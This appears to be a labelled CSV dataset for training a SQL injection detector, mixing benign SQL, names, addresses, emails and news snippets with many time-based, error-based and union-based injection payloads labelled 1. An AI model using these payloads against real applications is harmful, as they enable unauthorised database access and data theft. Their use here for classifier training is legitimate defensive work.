Sentence,Label
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'fnna'  =  'fnna",1
philip7,0
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1
69671861p,0
"  SELECT * FROM mark WHERE citizen IN  ( 'strip', 'prepare', 'pencil' )  ",0
select pg_sleep ( 5 )  and 'qfaz' like 'qfaz,1
ad5ma.sc9r,0
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'obmu'  =  'obmu",1
"1"" )  where 1700 = 1700 union all select null,null,null,null,null#",1
SELECT TOP 3 * FROM habit,0
llobet,0
aluda,0
silvie,0
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'vfnl'  =  'vfnl",1
"1'  )  )   or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  'uwrm' = 'uwrm",1
morishige-tombes@quierocortinas.do,0
 union all select @@version--,1
charpini_daillie@inmobiliariahangar.ly,0
SELECT * FROM printed WHERE halfway BETWEEN 'degree' AND 'blew',0
SELECT * FROM  ( SELECT battle FROM gun ) ,0
"grupo fuensanta 197, 12?a",0
"1'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1
"1""  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --",1
71579092x,0
" select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1",1
15124,0
"1"" where 2131 = 2131 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
SELECT AVG ( rocket )  FROM scientist  SELECT SUM ( gently ) ,0
8omp0r1ti6a,0
 Patron Johan Philipp Neumann mind mass performed part church services ,0
SELECT COUNT ( boneID ) FROM blank,0
3227728964471059,0
select  ( case when  ( 7852 = 7476 )  then 7852 else 7852* ( select 7852 from mysql.db )  end ) #,1
sempronia,0
SELECT * FROM older WHERE NOT regular = 'lead'  AND NOT clearly = 'straw',0
7466876651335348,0
7634,0
tornagua,0
 If current guidance achieved represent 12 17 per cent growth record $ 290,0
leonel,0
"1'|| ( select 'aoad' where 8795 = 8795 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  ||'",1
SELECT * FROM mouse 3 SELECT * FROM force,0
codos,0
 UPDATE collect SET couple = 'battle'WHERE bigger = 'earth',0
1' where 1652  =  1652 and sleep  (  5  )  #,1
l0cianesco,0
magriny,0
loyola,0
"SELECT * FROM himself WHERE worker BETWEEN ""powder"" AND    ""move""",0
SELECT AVG ( population ) FROM thread SELECT SUM ( at ) ,0
" &quot; This expense offloaded , &quot; Maier glad say ",0
SELECT COUNT ( shine )  FROM poet,0
"INSERT INTO sudden ( anybody, turn, faster, replace, tune, rose )  VALUES  ( 'coast', 'seven'. wear', 'basket', 'gave', 'count', 'worry' )  ",0
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",1
sanchopancesco,0
SELECT COUNT ( wait ) FROM army,0
" &quot; In statement Thursday , representative Jagger , 70 , says &quot; categorically denies ever made pass Katy Perry ",0
"1  )   as ujjg where 3125  =  3125 union all select null,null,null,null,null,null#",1
calle buenos aires 82 5-d,0
1' where 2547  =  2547 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1
"1""  )  )   as gbxx where 2459 = 2459 waitfor delay '0:0:5'--",1
SELECT cat FROM women,0
"1 where 7362 = 7362 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
altrichter@vilano.cu,0
SELECT * FROM master WHERE sang BETWEEN '1996-07-01' AND '1996-07-31',0
pagni7@freecreditcheck.bg,0
"-5014%""  )  )   )  or 3348 = 2430--",1
"1 or elt ( 6272 = 6272,sleep ( 5  )  )  -- ilfc",1
"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""blkt"" like ""blkt",1
pipiolo sandrini,0
9.16233E+015,0
cenheg,0
escriv,0
"-2500'  )  )   )  union all select 6853,6853,6853,6853--",1
SELECT political FROM kitchen UNION ALL SELECT fighting FROM ancient ORDER BY center,0
"  SELECT * FROM body WHERE told IN  ( 'moving', 'rest', 'since' )  ",0
"calle guiol 79, 10?c",0
"1%""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
heilig,0
forcades chocano,0
"1' )  where 9304 = 9304 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
8605729999999999,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_type_2766' LIMIT 1,0
reiko,0
aguadulce,0
4030398318773720,0
 select * from users where id = 1 +  ( \+ )  or 1 = 1 -- 1,1
bohdan,0
"1"" )  where 5491 = 5491",1
sheng-passanante@ankawaelda.int,0
1' )  as svtm where 7627 = 7627 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --,1
SELECT poetry,0
angele6@juegossonic.com.eh,0
6390,0
"1""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1"" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --",1
SELECT AVG ( without ) FROM because,0
SELECT taught ( s )  FROM did SELECT clock ( s ) ,0
38249138t,0
SELECT COUNT ( value )  FROM tea,0
SELECT * FROM stand FETCH FIRST 50 PERCENT ROWS ONLY,0
6470509098489788,0
SELECT COUNT ( thing )  FROM careful,0
1  )   as duqb where 6495  =  6495,1
"  SELECT TIME_TO_SEC ( ""-03:30:00"" ) ;",0
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",1
leni,0
"calle condor, 193 10f",0
505975000000000,0
morosa,0
5657119326927439,0
"1'  )  )   or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
" &quot; A job like something achieve overnight , &quot; said Gerster praise annual financial statement ",0
4735417998508375,0
1%' waitfor delay '0:0:5' and '%'  =  ',1
raab,0
1' where 6409  =  6409,1
"1 )  where 2741 = 2741 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
fambroug,0
"1""  )   and 4595  =  4595#",1
apartadero,0
"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1 )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ,1
cossovel-heintel@camiones-hibridos.ec,0
SELECT volume ( s ) FROM girl INNER JOIN,0
3948100340900216,0
-4023 or  ( 8779 = 5716 ) *5716,1
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1
newport,0
1'  )  )   and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (  'guxv' = 'guxv,1
da-1m1n,0
"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623 ) --",1
" select * from users where id = 1 union select !<1,version (  )  -- 1",1
"1' in boolean mode  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1'||  (  select 'frrk' from dual where 3145  =  3145 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1
raul,0
"1'  )  )   or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (  'gxgi' = 'gxgi",1
engh-stritzel@normatic-vending.lv,0
13,0
28191,0
"1' in boolean mode )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) #",1
lihul,0
select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
hoseok,0
servando,0
"1'  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( 'xdui' like 'xdui",1
pi9h329a,0
9629,0
7277765230207053,0
"1 )  and elt ( 4249 = 4249,7259 )  and  ( 8226 = 8226",1
apretn,0
"-5640""  )  )   or 9792 = 2728--",1
"  SELECT tired AS history, slide AS [too]  FROM plenty",0
boa4@sitienesunawebtienesunnegocio.es,0
89910635r,0
"-1076 union all select 3959,3959--",1
22194,0
1' )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and  ( 'cmqe' like 'cmqe,1
9140,0
"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",1
valladolid,0
"1""  )  )   as ajwe where 1153 = 1153 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --",1
"-9601'  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,1
tolan.herlie@movil-google.mx,0
SELECT * FROM rich WHERE seven NOT LIKE 'theory%',0
SELECT * FROM sky WHERE light BETWEEN '1996-07-01' AND '1996-07-31',0
dierking3@carmensanmartin.kn,0
SELECT * FROM riding FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM able,0
"   SELECT Employees.create, COUNT ( Orders.homeID )  AS captainFROM    ( OrdersINNER JOIN tool ON Orders.simplestID  =  Employees.dailyID ) ",0
calle marques de santillana 146 9b,0
SELECT * FROM machinery WHERE choice = 'plan',0
escat monistca,0
sal7orij4,0
" The dispute comes plane makers vie sell ever-larger versions twin-engined long-distance aircraft , potentially record orders expected November 17-21 event ",0
robillar,0
1'  )  )   and 2006 = 2006,1
"1',  (  select   (  case when   (  1902  =  5536  )   then 1 else 1902*  (  select 1902 from master..sysdatabases  )   end   )    )   ",1
95866747x,0
sedano montanyola,0
64115445r,0
06110,0
"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""ygzq"" like ""ygzq",1
-7742  )   as tgzq where 7842  =  7842 or 2062  =  1563,1
" In B Class , two teams Baiersbronn Freudenstadt faced Murgtalhalle Baiersbronn ",0
" On 21 June , conjunction Schwarzwaldverein &#91; Black Forest Association &#93; Mid-Summer Festival , 12 July Arena , accompanied fireworks , 13 December first concert put Stadtmusik (Town Musical Society) new Festival Hall ",0
if  (  6624  =  4232  )   select 6624 else drop function xyyt--,1
"c/ merced, 23, 3d",0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",1
"-4031""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""auhn""  =  ""auhn",1
i5bursa2i7,0
alpargatera,0
S,0
" select sleep ( 5 )  and  ( ""tlbp"" = ""tlbp",1
"1""  )  )   and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (  ""qqky"" like ""qqky",1
SELECT AVG ( screen ) FROM labor SELECT SUM ( sound ) ,0
dordas berttony,0
-2348  )   as sige where 1639  =  1639 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
SELECT COUNT ( DISTINCT command )  FROM return,0
calle bendicion 160,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 21 )  ORDER BY meta_id ASC",0
1%'  )  )   )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo )  and   (  (   ( '%' = ',1
SELECT * FROM sharp WHERE seed = 'within' LIMIT 3,0
DELETE FROM slightly,0
SELECT * FROM some WHERE paint = 'composition' FETCH FIRST 3 ROWS ONLY,0
-3880 )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 5194 = 5194,1
"  SELECT Orders.partyrID, Employees.your, Employees.roar FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.centralID ORDER BY Orders.deadID",0
5h5c8,0
"1"" where 4633 = 4633 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
"1'  )   union all select null,null,null,null,null,null--",1
stalin,0
-8051  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  5637  =  5637,1
'; exec  ( 'sel' + 'ect us' + 'er' ) ,1
SELECT * FROM enter WHERE shorter LIKE '%my%',0
277,0
SELECT TOP 3 * FROM sleep SELECT * FROM title 3SELECT * FROM silly,0
SELECT * FROM worry ORDER BY several,0
1957012493079149,0
"1' in boolean mode )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  #",1
"-1617%"" or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""%"" = """,1
"1', ( case when 5204 = 2136 then 1 else null end ) ",1
SELECT * FROM rod WHERE Price NOT BETWEEN 10 AND 20,0
waitfor delay '0:0:5' and  ( 4614 = 4614,1
SELECT * FROM paint WHERE century BETWEEN 'change' AND 'selection',0
8993570000000000,0
SELECT * FROM money FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM forest,0
4122797587162941,0
" SELECT * FROM arrow ORDER BY mud ASC, past DESC",0
SELECT nearby ( s )  FROM hay,0
"1%""  )   union all select null,null,null,null,null,null,null,null,null#",1
"1%"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
DELETE FROM prize,0
SELECT * FROM quiet WHERE arm = 'detail'  AND  ( fellow = 'service' OR cloud = 'flew' ) ,0
09227,0
"1'  )  )   as anaq where 9605 = 9605 and elt ( 4249 = 4249,7259 ) --",1
92937803r,0
mieres,0
"calle poador, 65 3a",0
1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
 judges compromising necessity judge avoid appearance partiality part series media interviews public statements responding publicly criticism court ,0
nodonk@locuraporno.ar,0
jecho,0
"1 )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ",1
totolate,0
jaca 75,0
"   SELECT COUNT ( studying ) , program FROM score BY former",0
5782307581968406,0
13710,0
SELECT AVG ( farm )  FROM stone  SELECT SUM ( instant ) ,0
"c/ barrio de recuesto, 195 6-h",0
1' )  where 2840 = 2840,1
 Benchmark U,0
" The victims said belonged competing gang , Hell &apos;s Angels ",0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  ",1
"   SELECT COUNT ( song ) , exactly FROM out BY ate",0
 Names participating lawmakers released coming days ,0
"c/ valdepalitos 155, 5-a",0
"1""  )  )   as qrrx where 4633 = 4633 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
1  )   where 1100  =  1100 and sleep  (  5  )  --,1
 Schulze one surprise ,0
-3059' )  as jhbh where 4056 = 4056 or  ( 3498 = 6965 ) *6965--,1
"1%"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
1' )  where 2227 = 2227,1
fuente el olmo de scar,0
SELECT we,0
" According guidelines , SE Haslach , church community , corporation public law , shall assume rights obligations six individual church communities ",0
hightower@freetag.cl,0
" Syria destroyed chemical weapons making ability , watchdog group says Syria destroyed critical equipment producing chemical weapons poison gas munitions , global chemical weapons watchdog said Thursday fierce clashes raged country &apos;s north , close one sites toxic agents believed stored ",0
1122690078978672,0
1'||  (  select 'tzxr' from dual where 2934  =  2934 and 4595  =  4595#,1
balitear,0
"   SELECT COUNT ( spring ) , use FROM hour BY wonder",0
"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",1
SELECT * FROM native FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT basket FROM eight,0
muras,0
 Georges Bwelle team volunteers performed 700 free surgeries past year ,0
SELECT two FROM snake UNION SELECT describe FROM gun ORDER BY here,0
" In addition, computation models use rich set syntactic features, improve complicated punctuation predictions global view, especially long range dependencies",0
DELETE FROM slope,0
SELECT period ( s )  FROM allow FULL OUTER JOIN,0
cosburn,0
aguzadera,0
"1'  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"-5849 )  union all select 6168,6168,6168,6168,6168,6168,6168,6168#",1
moyers,0
"1' )  as bfgl where 8959 = 8959 union all select null,null,null,null,null,null,null,null,null,null--",1
"1  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) # jpau",1
1  )  )   as oqyo where 7995 = 7995,1
kiri,0
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle' = 'qjle",1
2isnomo,0
"1%'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28638 )  ORDER BY meta_id ASC",0
1'+ ( select kfmv where 1679 = 1679,1
2528,0
"1'+ ( select 'plcm' where 2141 = 2141 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
"1' in boolean mode )  union all select null,null,null,null,null,null,null#",1
SELECT COUNT ( special ) FROM west,0
bardana,0
"isidoro rodriguez acevedo 192, 4h",0
SELECT AVG ( sea ) FROM differ SELECT SUM ( carefully ) ,0
-8301'   )    )     )   or   (  5708  =  5268  )  *5268 and    (    (     (  'hkha'  =  'hkha,1
SELECT TOP 3 * FROM hot,0
SELECT * FROM fall WHERE NOT attention = 'our'  AND NOT bad = 'plan',0
89416530m,0
admin' #,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 4982 )  ORDER BY meta_id ASC",0
margheti,0
"1%'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '",1
"1  )  )   )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
3803,0
8962,0
1 where 6827 = 6827,1
"1', ( begin if  ( 8340 = 8340 )  then dbms_lock.sleep ( 5 ) ",1
1'+  (  select 'hhnz' where 2465  =  2465,1
"1""  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"1' in boolean mode )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
esio,0
7288676162465612,0
-4184'   )    )     )   or 2579  =  4654#,1
74799380e,0
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'sdnc'  =  'sdnc",1
montclar,0
-6014'   )    )    or   (  9860  =  4848  )  *4848 and    (    (   'qtge'  =  'qtge,1
"1""   )    )    as fjtv where 8904  =  8904",1
"1""  )   as ltbl where 6395  =  6395",1
h46a00o,0
"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and 'swke' = 'swke",1
23591,0
SELECT Count ( * )  AS eaten,0
SELECT tears FROM people UNION SELECT aware FROM directly ORDER BY settle,0
SELECT * FROM nearer,0
rix.piljeckaja@waterflyesp.be,0
calle ulises s/n 11d,0
SELECT * FROM increase WHERE duck NOT BETWEEN 'position' AND 'decide',0
12810,0
SELECT * FROM compare WHERE period  BETWEEN 10 AND 20,0
"SELECT * FROM duty WHERE topic BETWEEN ""card"" AND    ""equipment""",0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  '%'  =  '",1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) ||'",1
4535011157826668,0
31253,0
SELECT DISTINCT effort FROM spell,0
"1""  )  )   as vxkn where 2443 = 2443 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
select pg_sleep ( 5 ) # pjvi,1
9.47299E+015,0
"1  )   as rsyw where 4857  =  4857 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"cuesta pizarro 12, 4?d",0
"  SELECT TIMEDIFF ( ""13:10:11"", ""13:10:10"" ) ;",0
 To read Philip K,0
1' )  where 9175 = 9175,1
SELECT result FROM proud UNION ALL SELECT farm FROM silk ORDER BY uncle,0
"1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'zoxm' like 'zoxm",1
calle carlos arniches 173,0
SELECT * FROM so WHERE    NOT nose = 'exercise',0
"1%""  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( ""%"" = """,1
 New anti-nicotine vaccine could take pleasure smoking Scientists developed anti-nicotine vaccine could take pleasure smoking cigarette ,0
"1%""  )  )   )  and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
-4644 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) # upwd,1
"1' in boolean mode  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1
4691061032427917,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'aatp'  =  'aatp",1
"1""  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  ""dyoe"" = ""dyoe",1
"1'  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( 'skdy' = 'skdy",1
SELECT DISTINCT everything FROM rear,0
trufa4dor,0
 This message 9th &apos; Immobilientag &apos; (Property Day) organised Börsen Zeitung (stock exchange newspaper),0
-3297' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
SELECT TOP 50 PERCENT * FROM instance SELECT * FROM widely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pack,0
" select * from users where id = 1 or 1#"" (  union select 1,version (  )  -- 1",1
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",1
SELECT * FROM  ( SELECT fight FROM roll ) ,0
"SELECT * FROM band WHERE sad BETWEEN ""cover"" AND    ""without""",0
 UPDATE later SET judge = 'level'WHERE history = 'lie',0
"1 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1
